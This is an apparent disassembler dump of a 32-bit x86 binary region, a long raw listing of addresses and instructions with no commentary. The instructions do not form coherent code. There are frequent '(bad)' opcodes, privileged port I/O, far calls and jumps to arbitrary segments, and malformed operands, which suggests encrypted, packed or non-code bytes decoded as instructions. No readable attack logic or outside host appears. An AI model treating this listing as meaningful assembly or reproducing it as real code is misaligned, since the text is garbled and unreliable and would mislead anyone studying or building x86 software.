  403f5d:	mov    ebx,0x172a6d72
  403f62:	cld    
  403f63:	sbb    cl,BYTE PTR [eax]
  403f65:	cld    
  403f66:	sub    DWORD PTR [ecx],eax
  403f68:	or     eax,DWORD PTR [esi-0x26]
  403f6b:	lods   eax,DWORD PTR ds:[esi]
  403f6c:	jbe    0x403f08
  403f6e:	sub    al,0xba
  403f70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f71:	adc    BYTE PTR [eax-0x7b72d872],bh
  403f77:	pop    edi
  403f78:	(bad)  
  403f79:	aas    
  403f7a:	dec    eax
  403f7b:	fstp   DWORD PTR [ebx+0x3ff93386]
  403f81:	inc    BYTE PTR [edi-0x5350146e]
  403f87:	stc    
  403f88:	enter  0xd180,0x6c
  403f8c:	push   cs
  403f8d:	push   0xcebfd5b5
  403f92:	rol    DWORD PTR [ebp-0x7bd955b3],1
  403f98:	imul   esi,DWORD PTR [edi+ebp*8-0x154601a2],0x4db4854
  403fa3:	pop    eax
  403fa4:	popa   
  403fa5:	ffreep st(5)
  403fa7:	aas    
  403fa8:	retf   0xe0bc
  403fab:	(bad)  [edi]
  403fad:	mov    esp,0xfa94d33b
  403fb2:	mov    esi,0x6647ead1
  403fb7:	outs   dx,BYTE PTR ds:[esi]
  403fb8:	sbb    DWORD PTR [ecx+0x51200c80],ebx
  403fbe:	js     0x404012
  403fc0:	inc    edx
  403fc1:	scas   al,BYTE PTR es:[edi]
  403fc2:	stos   DWORD PTR es:[edi],eax
  403fc3:	mov    ebx,0x4b1dc28d
  403fc8:	shl    BYTE PTR [ecx],1
  403fca:	add    al,0x3d
  403fcc:	adc    BYTE PTR [edx+0xd],bl
  403fcf:	mov    bh,0x5b
  403fd1:	add    al,BYTE PTR [esi+0x73]
  403fd4:	iret   
  403fd5:	or     ebp,ecx
  403fd7:	nop
  403fd8:	mov    dl,0x27
  403fda:	stos   DWORD PTR es:[edi],eax
  403fdb:	dec    esi
  403fdc:	sbb    dl,BYTE PTR [eax]
  403fde:	sub    ch,BYTE PTR [ebp+0x4a5106e9]
  403fe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fe5:	inc    ecx
  403fe6:	out    dx,al
  403fe7:	jmp    0x403f69
  403fe9:	mov    al,0x10
  403feb:	clc    
  403fec:	pop    ss
  403fed:	push   esp
  403fee:	cli    
  403fef:	push   edi
  403ff0:	xor    DWORD PTR [esp+esi*2-0x8],0x8daffed9
  403ff8:	cmp    al,0x64
  403ffa:	mov    ds:0x18572740,eax
  403fff:	mov    al,ds:0x5b416fee
  404004:	out    0x84,eax
  404006:	xchg   esi,eax
  404007:	and    BYTE PTR [esp+edx*8-0x31],0xee
  40400c:	mov    cl,0xf3
  40400e:	xor    ecx,eax
  404010:	inc    esi
  404011:	bound  ebx,QWORD PTR [edi]
  404013:	call   0xebfeb131
  404018:	retf   
  404019:	mov    dl,0x1e
  40401b:	cld    
  40401c:	(bad)  
  40401d:	push   ds
  40401e:	mov    dl,0x26
  404020:	dec    ecx
  404021:	mov    ebp,DWORD PTR [ecx-0x39b1aaf9]
  404027:	add    dh,BYTE PTR [ebp-0x78]
  40402a:	mov    al,0x94
  40402c:	es inc ebx
  40402e:	test   al,0x10
  404030:	data16 mul BYTE PTR [esi]
  404033:	mov    esi,0xc247e28d
  404038:	loope  0x404084
  40403a:	test   al,0xe0
  40403c:	retf   0xd1a2
  40403f:	std    
  404040:	xchg   edi,eax
  404041:	mov    eax,0x52befd6
  404046:	shr    edx,cl
  404048:	imul   ebx,eax,0xffffffe3
  40404b:	(bad)  
  40404c:	cmp    eax,0x8ca10afd
  404051:	mov    WORD PTR [ecx+ebx*4+0x7c],ss
  404055:	fidivr DWORD PTR [ebx]
  404057:	mov    edi,0x85bb5008
  40405c:	xor    cl,bh
  40405e:	jbe    0x40403d
  404060:	test   DWORD PTR [eax-0x7c],edx
  404063:	nop
  404064:	push   esp
  404065:	mov    al,0x87
  404067:	scas   al,BYTE PTR es:[edi]
  404068:	in     al,dx
  404069:	inc    esp
  40406a:	lahf   
  40406b:	cwde   
  40406c:	jmp    0x403ff3
  40406e:	sbb    al,0xa9
  404070:	popf   
  404071:	pop    edx
  404072:	jg     0x4040aa
  404074:	lods   eax,DWORD PTR ds:[esi]
  404075:	fmul   DWORD PTR [ecx-0x26]
  404078:	jnp    0x4040ec
  40407a:	call   0x2393:0xb808004c
  404081:	mov    esp,0x9da3251c
  404086:	test   al,0x6f
  404088:	sub    ecx,DWORD PTR [eax]
  40408a:	jp     0x4040d8
  40408c:	jl     0x4040e8
  40408e:	sbb    eax,0x41d31346
  404093:	push   edi
  404094:	or     DWORD PTR [eax-0x54],0x42
  404098:	mov    ds:0x6910ab28,eax
  40409d:	xor    BYTE PTR [edx-0x7322892d],cl
  4040a3:	pushf  
  4040a4:	ror    BYTE PTR [ecx],0x1
  4040a7:	cwde   
  4040a8:	mov    ch,0x63
  4040aa:	call   0x3a6aff72
  4040af:	mov    dl,0xee
  4040b1:	inc    ebp
  4040b2:	push   edx
  4040b3:	adc    eax,0x60c1ab48
  4040b8:	out    dx,al
  4040b9:	call   0x572a:0xb0d20dd0
  4040c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040c1:	test   dl,cl
  4040c3:	loope  0x404117
  4040c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040c6:	sub    DWORD PTR [esi],eax
  4040c8:	mov    esi,0xe817bf8a
  4040cd:	mov    DWORD PTR [esp+eax*1+0x32],eax
  4040d1:	push   cs
  4040d2:	xor    ah,BYTE PTR [esi]
  4040d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040d5:	push   cs
  4040d6:	adc    DWORD PTR [eax-0x452e45ff],ebx
  4040dc:	jae    0x404108
  4040de:	loop   0x404134
  4040e0:	add    DWORD PTR [ebp-0x4e],0xffffffae
  4040e4:	fs xchg ebp,eax
  4040e6:	adc    esi,edx
  4040e8:	xchg   DWORD PTR [esp+ecx*8],eax
  4040eb:	lock mov dh,0xd0
  4040ee:	fisubr DWORD PTR [edx+0x77]
  4040f1:	stos   DWORD PTR es:[edi],eax
  4040f2:	shl    BYTE PTR [ebx-0x1],1
  4040f5:	in     eax,0x3c
  4040f7:	ja     0x40416e
  4040f9:	pushf  
  4040fa:	cmp    al,0xf4
  4040fc:	call   ecx
  4040fe:	adc    al,0x60
  404100:	push   ss
  404101:	ss popf 
  404103:	or     ebx,edi
  404105:	inc    edx
  404106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404107:	push   esp
  404108:	and    eax,esp
  40410a:	cwde   
  40410b:	sahf   
  40410c:	loope  0x404144
  40410e:	scas   eax,DWORD PTR es:[edi]
  40410f:	add    eax,0x100ab6a8
  404114:	pop    esp
  404115:	push   esi
  404116:	push   es
  404117:	add    DWORD PTR [ebx+0x1735d5fd],0x729753f1
  404121:	ret    
  404122:	dec    esp
  404123:	adc    edi,esi
  404125:	mov    WORD PTR [edi],gs
  404127:	fcomip st,st(7)
  404129:	mov    ?,WORD PTR [ecx+eiz*8-0x34]
  40412d:	iret   
  40412e:	test   al,0xe
  404130:	out    0x7f,al
  404132:	cmovbe edx,DWORD PTR [ecx+0x264b174f]
  404139:	mov    eax,DWORD PTR [ebx-0x555e0793]
  40413f:	lods   eax,DWORD PTR ds:[esi]
  404140:	enter  0x7c94,0x50
  404144:	adc    dh,BYTE PTR [esi-0x7263c094]
  40414a:	jmp    0x5b13:0xec9eece8
  404151:	lea    esi,[ebp-0x69]
  404154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404155:	dec    esi
  404156:	jbe    0x4040ee
  404158:	cmp    ch,BYTE PTR ds:0x733f19e1
  40415e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40415f:	adc    al,BYTE PTR fs:[edi+0x5ab38db6]
  404166:	or     eax,0x4410e7db
  40416b:	dec    BYTE PTR [edx-0x11]
  40416e:	adc    DWORD PTR [ebx+0x46],edi
  404171:	addr16 xor edx,esp
  404174:	fwait
  404175:	dec    ebx
  404176:	xor    DWORD PTR [edx+0x10038a27],edx
  40417c:	in     eax,0xc
  40417e:	inc    edx
  40417f:	call   0x3561:0xd9b2b448
  404186:	push   0xa28cfde6
  40418b:	add    DWORD PTR [edx],esp
  40418d:	(bad)  
  40418e:	sbb    eax,0x404989c8
  404193:	or     eax,0xd9774788
  404198:	push   esi
  404199:	or     al,ah
  40419b:	sbb    eax,0x6ff1e050
  4041a0:	jle    0x40420f
  4041a2:	mov    bl,0xc4
  4041a4:	xchg   dl,ch
  4041a6:	ret    0xb2f7
  4041a9:	scas   al,BYTE PTR es:[edi]
  4041aa:	push   cs
  4041ab:	inc    ecx
  4041ac:	pop    ss
  4041ad:	hlt    
  4041ae:	cs arpl di,bx
  4041b1:	xchg   ecx,eax
  4041b2:	test   al,0xb6
  4041b4:	in     eax,dx
  4041b5:	push   ss
  4041b6:	fs into 
  4041b8:	inc    ebp
  4041b9:	loopne 0x40413e
  4041bb:	fisttp DWORD PTR [edi+0x40bb5a9d]
  4041c1:	daa    
  4041c2:	mov    bl,0x81
  4041c4:	ss push 0xfd84820e
  4041ca:	ror    BYTE PTR [edi],1
  4041cc:	jns    0x40419b
  4041ce:	dec    ebp
  4041cf:	or     ecx,edi
  4041d1:	fndisi(8087 only) 
  4041d3:	sub    edx,DWORD PTR [edx+0x779dde5c]
  4041d9:	lods   eax,DWORD PTR ds:[esi]
  4041da:	div    BYTE PTR [edx]
  4041dc:	pop    esp
  4041dd:	mov    ch,0x6e
  4041df:	pop    edi
  4041e0:	jg     0x4041f2
  4041e2:	mov    dl,0xbd
  4041e4:	inc    ebp
  4041e5:	inc    esp
  4041e6:	imul   esi,DWORD PTR [ebx+0x138b89ba],0x3a7675e7
  4041f0:	mov    ebp,DWORD PTR [edi]
  4041f2:	cmp    edi,esi
  4041f4:	out    dx,eax
  4041f5:	xlat   BYTE PTR ds:[ebx]
  4041f6:	pop    edi
  4041f7:	sti    
  4041f8:	adc    eax,0xae01f179
  4041fd:	leave  
  4041fe:	push   es
  4041ff:	push   cs
  404200:	mov    dl,0x81
  404202:	stos   BYTE PTR es:[edi],al
  404203:	sub    ch,BYTE PTR [edi-0xea90352]
  404209:	sahf   
  40420a:	sar    BYTE PTR [edi+ebx*2],cl
  40420d:	sub    DWORD PTR ds:0xe269a8fd,edx
  404213:	rcl    bh,1
  404215:	cld    
  404216:	inc    ecx
  404217:	hlt    
  404218:	loope  0x40428e
  40421a:	or     eax,0x11422188
  40421f:	mov    esp,esp
  404221:	sbb    BYTE PTR [esi+0xcbf9a40],dl
  404227:	cld    
  404228:	les    esp,FWORD PTR [ebx]
  40422a:	mov    edx,0x810471ee
  40422f:	bound  esi,QWORD PTR [ebx+0x64855243]
  404235:	leave  
  404236:	xor    ebx,eax
  404238:	lods   eax,DWORD PTR ds:[esi]
  404239:	or     al,0x2
  40423b:	inc    edi
  40423c:	(bad)  
  40423d:	mov    ch,0xc
  40423f:	outs   dx,BYTE PTR ds:[esi]
  404240:	sub    BYTE PTR [edx+0x618da8d5],al
  404246:	cmp    ebx,DWORD PTR [edi-0x26efcec]
  40424c:	(bad)  
  40424d:	mov    dl,0x49
  40424f:	or     edx,DWORD PTR [edi-0x68]
  404252:	jp     0x404217
  404254:	cmp    al,0x13
  404256:	xor    eax,0x25e686df
  40425b:	enter  0x54a,0x40
  40425f:	pushf  
  404260:	adc    BYTE PTR [eax-0x73d6883a],dh
  404266:	jmp    0xd987:0xe8f522a2
  40426d:	(bad)  
  40426e:	pop    esp
  40426f:	sbb    ebx,edx
  404271:	jg     0x4041f3
  404273:	cs mov eax,0xc4fef5d5
  404279:	pop    ss
  40427a:	jp     0x404284
  40427c:	mov    al,ds:0x51eb569b
  404281:	push   es
  404282:	std    
  404283:	(bad)  
  404284:	cmp    DWORD PTR [esi+0x27],ebp
  404287:	retf   
  404288:	addr16 and dh,cl
  40428b:	and    eax,0x84d371bf
  404290:	neg    ah
  404292:	pop    edx
  404293:	cmp    DWORD PTR [ebx+0x2dc730d5],eax
  404299:	xchg   edx,eax
  40429a:	dec    esp
  40429b:	push   ds
  40429c:	push   ebx
  40429d:	lahf   
  40429e:	xchg   DWORD PTR [eax],ebp
  4042a0:	pop    es
  4042a1:	lea    esp,[esi+0x112ec5c9]
  4042a7:	cmp    al,0x8c
  4042a9:	scas   al,BYTE PTR es:[edi]
  4042aa:	(bad)  
  4042ab:	add    BYTE PTR [ebx],0x1c
  4042ae:	mov    ?,WORD PTR [ebp-0x4e8b6790]
  4042b4:	adc    cl,ah
  4042b6:	add    esi,edx
  4042b8:	retf   
  4042b9:	xchg   esi,eax
  4042ba:	fisub  WORD PTR [esi]
  4042bc:	and    ecx,edx
  4042be:	ret    0xfad7
  4042c1:	mov    bl,0xb
  4042c3:	fldl2e 
  4042c5:	test   cl,ch
  4042c7:	mov    eax,0x86bf61d0
  4042cc:	js     0x40428b
  4042ce:	cdq    
  4042cf:	dec    ebp
  4042d0:	sbb    edx,0xffffffec
  4042d3:	fucomp st(2)
  4042d5:	xchg   edi,eax
  4042d6:	xor    DWORD PTR [eax],ebx
  4042d8:	aam    0x2b
  4042da:	test   eax,0xff85aee5
  4042df:	dec    ecx
  4042e0:	adc    esi,DWORD PTR [ebx]
  4042e2:	push   ecx
  4042e3:	in     al,dx
  4042e4:	mov    esp,ds
  4042e6:	jmp    0xb09f6594
  4042eb:	and    DWORD PTR [edx],ebx
  4042ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042ee:	pop    edi
  4042ef:	push   edi
  4042f0:	stc    
  4042f1:	pushf  
  4042f2:	mov    ds:0xadaa0a60,eax
  4042f7:	lahf   
  4042f8:	sahf   
  4042f9:	pop    ecx
  4042fa:	jmp    DWORD PTR [eax]
  4042fc:	rcl    DWORD PTR [ecx+0x6c],1
  4042ff:	dec    eax
  404300:	loope  0x4042cc
  404302:	mov    ch,0x3e
  404304:	loope  0x404360
  404306:	push   ss
  404307:	adc    ebp,DWORD PTR [edi+0x16]
  40430a:	jnp    0x404374
  40430c:	xor    eax,0x9f180b75
  404311:	jnp    0x4042c5
  404313:	xlat   BYTE PTR ds:[ebx]
  404314:	popa   
  404315:	outs   dx,BYTE PTR ds:[esi]
  404316:	call   0x48359c71
  40431b:	imul   esi,DWORD PTR [edx+0x69aae7e9],0xc5b2c5cc
  404325:	adc    bl,BYTE PTR [eax+0x589f97be]
  40432b:	pop    ds
  40432c:	fadd   DWORD PTR [edx-0x1080b299]
  404332:	sti    
  404333:	shl    DWORD PTR [ecx-0x37c971c5],0xc0
  40433a:	cwde   
  40433b:	sahf   
  40433c:	jb     0x4043b3
  40433e:	pop    edi
  40433f:	(bad)  [ebx]
  404341:	sbb    ebp,edx
  404343:	jo     0x4043b8
  404345:	or     esi,DWORD PTR [ecx+eax*8]
  404348:	cmp    edi,DWORD PTR [eax-0x14]
  40434b:	xchg   DWORD PTR [edx-0x15972fdd],ebp
  404351:	popf   
  404352:	js     0x4042dd
  404354:	fiadd  WORD PTR [esi-0x63f5994d]
  40435a:	xlat   BYTE PTR ds:[ebx]
  40435b:	mov    dl,0x99
  40435d:	inc    ebx
  40435e:	jns    0x4043a0
  404360:	sbb    DWORD PTR [esi-0x7e],edx
  404363:	outs   dx,DWORD PTR ds:[esi]
  404364:	lods   eax,DWORD PTR ds:[esi]
  404365:	sub    eax,0x155f0673
  40436a:	rol    BYTE PTR [ebp+0x37],0xae
  40436e:	aad    0xe3
  404370:	xor    BYTE PTR [edx],al
  404372:	xchg   BYTE PTR [ecx],bh
  404374:	adc    edx,DWORD PTR [edi+0x26e9fa36]
  40437a:	sub    al,al
  40437c:	int    0x45
  40437e:	cld    
  40437f:	mov    cl,0x9f
  404381:	int    0x3b
  404383:	mov    dl,bl
  404385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404386:	jb     0x40430f
  404388:	test   DWORD PTR [eax+ebx*8],edi
  40438b:	dec    esp
  40438c:	pop    es
  40438d:	jnp    0x404385
  40438f:	les    edx,FWORD PTR [edx+0x352bd8f4]
  404395:	dec    ebx
  404396:	(bad)  
  404397:	in     al,0xfd
  404399:	cs pop esi
  40439b:	inc    eax
  40439c:	nop
  40439d:	scas   eax,DWORD PTR es:[edi]
  40439e:	push   ecx
  40439f:	adc    DWORD PTR [edx-0x35],ecx
  4043a2:	and    eax,0x12640b41
  4043a7:	shr    esp,0xa8
  4043aa:	cld    
  4043ab:	xor    al,0xb5
  4043ad:	lods   eax,DWORD PTR ds:[esi]
  4043ae:	imul   esi,DWORD PTR [edx-0x239cfb36],0xffffffb8
  4043b5:	les    ebp,FWORD PTR [esi+0x6f6d847a]
  4043bb:	enter  0xfbaf,0xf6
  4043bf:	div    DWORD PTR [edx+0x2c]
  4043c2:	mov    eax,ds:0x2ecdae69
  4043c7:	jnp    0x4043d4
  4043c9:	xlat   BYTE PTR ds:[ebx]
  4043ca:	sbb    DWORD PTR [ecx-0x57],esp
  4043cd:	pop    ebx
  4043ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043cf:	mov    ds:0x986651bf,al
  4043d4:	adc    al,bh
  4043d6:	stos   DWORD PTR es:[edi],eax
  4043d7:	shl    BYTE PTR [ebx],0xb2
  4043da:	adc    edi,DWORD PTR [ebx-0x47]
  4043dd:	in     eax,dx
  4043de:	xor    eax,0xc907e0b7
  4043e3:	jmp    0x85aa:0xf2495ef2
  4043ea:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4043ec:	arpl   ax,bp
  4043ee:	pop    esi
  4043ef:	jle    0x40441e
  4043f1:	repnz imul edx,DWORD PTR ds:0xa28ed8b6,0x510ac28c
  4043fc:	jb     0x4043dc
  4043fe:	test   BYTE PTR [edx-0x34c7391e],cl
  404404:	mov    ecx,0x14569756
  404409:	cwde   
  40440a:	(bad)  
  40440c:	sub    ebp,DWORD PTR [ebp-0x21b306bd]
  404412:	mov    ah,BYTE PTR [edx+eax*1+0x34b3429d]
  404419:	mov    ds:0x25f1e58b,eax
  40441e:	loop   0x40448e
  404420:	xchg   DWORD PTR es:[edi+0x25],ebx
  404424:	sub    DWORD PTR [edi-0x1986e60c],ebx
  40442a:	sbb    ecx,0xc779c481
  404430:	jo     0x404400
  404432:	jo     0x404495
  404434:	lock inc eax
  404436:	or     DWORD PTR [esi+0x22],edi
  404439:	rcr    DWORD PTR [edi],0x5
  40443c:	adc    al,0x57
  40443e:	lea    esp,[ebp-0x29]
  404441:	add    al,0xfa
  404443:	mov    dl,0xef
  404445:	pop    es
  404446:	out    0x9e,eax
  404448:	adc    al,0xbf
  40444a:	pop    esp
  40444b:	and    al,0x35
  40444d:	mov    ch,0xdc
  40444f:	fidiv  WORD PTR [esi]
  404451:	or     esp,DWORD PTR [edi]
  404453:	lea    edx,[edi]
  404455:	stc    
  404456:	js     0x40448f
  404458:	aam    0x44
  40445a:	out    dx,al
  40445b:	int3   
  40445c:	aad    0xfe
  40445e:	int    0x9d
  404460:	iret   
  404461:	sti    
  404462:	and    DWORD PTR [esi],0x74b5ee97
  404468:	or     ecx,DWORD PTR [ecx+0x2d]
  40446b:	or     edi,esp
  40446d:	sub    DWORD PTR [eax-0x6f1fbc87],ebp
  404473:	test   DWORD PTR [edi+0x7b2d060a],eax
  404479:	js     0x4044d6
  40447b:	mov    bl,0x35
  40447d:	cmp    eax,0x6ca71a5
  404482:	rcr    DWORD PTR [esi],1
  404484:	(bad)  
  404485:	(bad)  
  404487:	in     eax,dx
  404488:	mov    ebx,DWORD PTR [ebx+0x3b]
  40448b:	mov    edx,0xd26c71cb
  404490:	jne    0x40441d
  404492:	cmp    ecx,DWORD PTR [eax+0x38370acc]
  404498:	or     BYTE PTR [ebp+0x72ecdd7d],ah
  40449e:	dec    ebx
  40449f:	add    BYTE PTR [eax+0x3d],0xfd
  4044a3:	lahf   
  4044a4:	add    DWORD PTR [eax],esp
  4044a6:	cmp    al,0x18
  4044a8:	loopne 0x4044c3
  4044aa:	inc    esi
  4044ab:	push   0xffffffca
  4044ad:	sti    
  4044ae:	in     al,dx
  4044af:	sub    al,0xb1
  4044b1:	loop   0x40452d
  4044b3:	push   esi
  4044b4:	or     al,0xde
  4044b6:	push   esp
  4044b7:	stc    
  4044b8:	mov    al,ds:0x5d96340c
  4044bd:	into   
  4044be:	and    al,0xc4
  4044c0:	cmp    esp,ecx
  4044c2:	scas   eax,DWORD PTR es:[edi]
  4044c3:	adc    dh,BYTE PTR [edx-0x80]
  4044c6:	jb     0x404492
  4044c8:	aas    
  4044c9:	lods   eax,DWORD PTR ds:[esi]
  4044ca:	jns    0x40447f
  4044cc:	cwde   
  4044cd:	cli    
  4044ce:	dec    edx
  4044cf:	lea    ebp,[eax-0x304f96f4]
  4044d5:	xchg   edi,eax
  4044d6:	in     al,dx
  4044d7:	scas   al,BYTE PTR es:[edi]
  4044d8:	mov    bh,0x7f
  4044da:	std    
  4044db:	shl    BYTE PTR [esi+0x66],0x4c
  4044df:	mov    esp,ebx
  4044e1:	mov    esi,0x872f4ee8
  4044e6:	jmp    0x550b:0x6d078e8a
  4044ed:	(bad)  
  4044ee:	or     al,0x14
  4044f0:	jbe    0x40450a
  4044f2:	scas   eax,DWORD PTR es:[edi]
  4044f3:	in     al,0x45
  4044f5:	xor    cl,BYTE PTR [edx+0x5d7f64f1]
  4044fb:	sbb    BYTE PTR [ebx-0x4047abba],cl
  404501:	imul   ebp,DWORD PTR [edi+ebx*4],0xafe63d64
  404508:	sub    ch,al
  40450a:	cmp    al,0xb1
  40450c:	adc    BYTE PTR [ebx+0x58],bl
  40450f:	or     eax,0x8545fc39
  404514:	adc    DWORD PTR [edx],ebp
  404516:	inc    esi
  404517:	inc    edx
  404518:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404519:	xor    BYTE PTR ds:[ebx],cl
  40451c:	lahf   
  40451d:	sbb    DWORD PTR [eax+0xfb9de89],edi
  404523:	xor    cl,BYTE PTR [esi+0x594740b4]
  404529:	mov    ds:0x892b9b32,eax
  40452e:	or     DWORD PTR [eax-0x5c],esi
  404531:	arpl   WORD PTR [ebx],ax
  404533:	lods   eax,DWORD PTR ds:[esi]
  404534:	sub    DWORD PTR [edx+0x37],eax
  404537:	adc    dl,BYTE PTR [ecx-0x34]
  40453a:	and    DWORD PTR [edx],esp
  40453c:	das    
  40453d:	fs or  dh,al
  404540:	jo     0x404584
  404542:	inc    ebx
  404543:	cli    
  404544:	and    DWORD PTR [esi+0x1709a152],ecx
  40454a:	out    0x30,al
  40454c:	cmp    al,0x51
  40454e:	daa    
  40454f:	xlat   BYTE PTR ds:[ebx]
  404550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404551:	push   ds
  404552:	clc    
  404553:	imul   BYTE PTR [esi+0x43be2e3d]
  404559:	bound  ecx,QWORD PTR [ecx]
  40455b:	xchg   ecx,eax
  40455c:	and    DWORD PTR [edx],0x62
  40455f:	ret    0x3b87
  404562:	adc    DWORD PTR [ecx+0x7f0dff3d],ecx
  404568:	or     BYTE PTR [ecx],dl
  40456a:	push   ds
  40456b:	loopne 0x404586
  40456d:	lock push cs
  40456f:	xor    ebx,DWORD PTR [eax+esi*1+0x30]
  404573:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404574:	lea    ebp,[eax]
  404576:	ret    0xae5a
  404579:	jnp    0x4045ba
  40457b:	ja     0x40452e
  40457d:	pop    ebx
  40457e:	call   0xaabb:0xa899278d
  404585:	push   ss
  404586:	mov    BYTE PTR [edi+0x50ba7b93],bh
  40458c:	adc    al,0x93
  40458e:	xchg   edi,eax
  40458f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404590:	sahf   
  404591:	ret    
  404592:	inc    eax
  404593:	pop    eax
  404594:	jns    0x404537
  404596:	mov    ebx,0xec4dcb4b
  40459b:	xchg   esi,eax
  40459c:	retf   0x6bb2
  40459f:	fdiv   DWORD PTR [edi+0x55]
  4045a2:	popf   
  4045a3:	enter  0x862d,0x61
  4045a7:	out    0x25,al
  4045a9:	inc    ebx
  4045aa:	mov    ds:0x4a65c3bb,eax
  4045af:	fnstenv [edx]
  4045b1:	out    0xd,eax
  4045b3:	sub    edi,DWORD PTR [edx-0x39]
  4045b6:	xchg   edi,eax
  4045b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045b8:	(bad)  
  4045b9:	ja     0x4045e8
  4045bb:	cmp    DWORD PTR [eax],esi
  4045bd:	dec    ebp
  4045be:	and    DWORD PTR [ebp+0xc],ecx
  4045c1:	btc    ebx,edi
  4045c4:	clc    
  4045c5:	xchg   esi,eax
  4045c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045c7:	xlat   BYTE PTR ds:[ebx]
  4045c8:	dec    ebx
  4045c9:	pop    edi
  4045ca:	(bad)  
  4045cb:	or     BYTE PTR [esi+0x5a],ah
  4045ce:	in     eax,0x57
  4045d0:	cmp    ecx,DWORD PTR [eax-0x6d26cf3]
  4045d6:	mov    al,0xd3
  4045d8:	fidiv  DWORD PTR [edx-0x2f]
  4045db:	xor    BYTE PTR [edi-0x12],bl
  4045de:	push   esi
  4045df:	out    dx,al
  4045e0:	int    0xd8
  4045e2:	jle    0x4045a0
  4045e4:	(bad)  
  4045e5:	retf   
  4045e6:	jbe    0x40460d
  4045e8:	ja     0x40460e
  4045ea:	clc    
  4045eb:	ins    DWORD PTR es:[edi],dx
  4045ec:	inc    esp
  4045ed:	js     0x40457f
  4045ef:	sub    BYTE PTR [esi+edi*4-0x1],bl
  4045f3:	js     0x404630
  4045f5:	cmp    dh,BYTE PTR [esi+0x14]
  4045f8:	imul   ebx,DWORD PTR fs:[ecx+0xb],0xffffffde
  4045fd:	cmp    eax,0x1a6b0ab0
  404602:	sahf   
  404603:	cmp    esi,0xffffffe1
  404606:	lock or eax,0x7d2beaf0
  40460c:	loop   0x4045d7
  40460e:	sbb    BYTE PTR [edx+esi*2+0x532cd2dc],bh
  404615:	jmp    0x722c:0x7c454154
  40461c:	mov    ecx,0xe0c8587f
  404621:	push   cs
  404622:	sub    DWORD PTR [esi+0x16b1eee0],esi
  404628:	mov    esp,0x6c046475
  40462d:	fwait
  40462e:	retf   0xfb61
  404631:	aam    0xd4
  404633:	mov    ch,0x2b
  404635:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404636:	adc    ecx,ebx
  404638:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404639:	add    DWORD PTR [ecx-0x20],esi
  40463c:	(bad)  
  40463e:	sti    
  40463f:	imul   edi,DWORD PTR ds:0xf1110859,0xee3240c4
  404649:	and    DWORD PTR [edx-0x3d452ab4],eax
  40464f:	(bad)  
  404651:	je     0x4046ae
  404653:	mov    WORD PTR [esi],fs
  404655:	ficomp DWORD PTR [edi-0x5ac38abf]
  40465b:	loope  0x40465f
  40465d:	fxch   st(7)
  40465f:	shl    DWORD PTR [eax],1
  404661:	(bad)  
  404662:	cli    
  404663:	sub    edi,DWORD PTR [edx+0x3771dd5a]
  404669:	add    eax,0x6b3301d0
  40466f:	nop
  404670:	push   esi
  404671:	mov    eax,ds:0xc0951d7d
  404676:	loop   0x404635
  404678:	je     0x4046e7
  40467a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40467b:	jg     0x4046f5
  40467d:	mov    al,bh
  40467f:	mov    ds:0xbd100312,eax
  404684:	sub    BYTE PTR [edi],bh
  404686:	std    
  404687:	cs sahf 
  404689:	rol    DWORD PTR [ebp-0x59],0xd2
  40468d:	sub    DWORD PTR [esi-0x527f915a],esp
  404693:	in     al,0x11
  404695:	nop
  404696:	enter  0xa421,0xeb
  40469a:	and    edx,edx
  40469c:	retf   0x1bb1
  40469f:	cmp    esp,DWORD PTR [edi]
  4046a1:	fldcw  WORD PTR [edi-0xe755e76]
  4046a7:	sub    eax,0x122541cf
  4046ac:	out    dx,al
  4046ad:	pop    ebx
  4046ae:	adc    BYTE PTR [esi-0x7086add8],dh
  4046b4:	mov    bl,0x8b
  4046b6:	test   BYTE PTR [eax+0x55cfcf8a],dl
  4046bc:	add    esi,DWORD PTR [eax-0x6e]
  4046bf:	cld    
  4046c0:	pop    esi
  4046c1:	push   0xda4bd469
  4046c6:	in     eax,0x70
  4046c8:	das    
  4046c9:	dec    eax
  4046ca:	mov    edi,0xb6a2a8bd
  4046cf:	mov    edi,0x83e8f3af
  4046d4:	daa    
  4046d5:	sbb    esp,esi
  4046d7:	mov    ebp,0x2fd1dfe1
  4046dc:	je     0x404733
  4046de:	add    bl,dl
  4046e0:	stos   BYTE PTR es:[edi],al
  4046e1:	out    0x3b,eax
  4046e3:	add    edi,esp
  4046e5:	out    dx,eax
  4046e6:	mov    WORD PTR [esi+edi*4+0x67],ss
  4046ea:	jmp    0xeedbbf5f
  4046ef:	adc    edx,DWORD PTR [edx-0x60945786]
  4046f5:	mov    ebx,es
  4046f7:	and    eax,0x727c6e3e
  4046fc:	xor    bl,BYTE PTR [eax-0x76755ede]
  404702:	cld    
  404703:	xchg   ebp,eax
  404704:	adc    eax,0xc66599cc
  404709:	enter  0xb8d3,0xc4
  40470d:	inc    edi
  40470e:	(bad)  
  40470f:	daa    
  404710:	add    DWORD PTR [ecx+0x11],edx
  404713:	pop    ss
  404714:	(bad)  
  404715:	(bad)  
  404716:	xchg   ebx,eax
  404717:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404718:	mov    ah,0xb8
  40471a:	dec    ebx
  40471b:	sub    BYTE PTR [edi-0x385bba6a],cl
  404721:	mov    edi,0xc57668c3
  404726:	mov    esp,0xe8486d8f
